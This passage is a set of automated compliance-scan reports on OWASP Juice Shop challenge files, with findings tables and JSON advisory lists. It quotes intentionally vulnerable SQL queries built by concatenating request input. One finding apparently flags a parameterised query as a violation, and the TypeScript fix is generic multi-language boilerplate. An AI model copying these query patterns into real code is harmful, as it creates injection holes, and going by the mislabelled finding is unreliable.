[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 11, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/dbSchemaChallenge_1.ts`
**Scanned at**: 2026-10-11T16:35:03.857902+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 5 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 5
models.sequelize.query("SELECT * FROM Products WHERE ((name LIKE '%"+criteria+"%' OR description LIKE '%"+criteria+"%') AND deletedAt IS NULL) ORDER BY name")
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 5, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginBenderChallenge_2_correct.ts`
**Scanned at**: 2026-10-11T16:35:11.961393+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $mail AND password = $pass AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginBenderChallenge_1.ts`
**Scanned at**: 2026-10-11T16:35:11.620215+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 18 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 18
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: t...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 18, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": 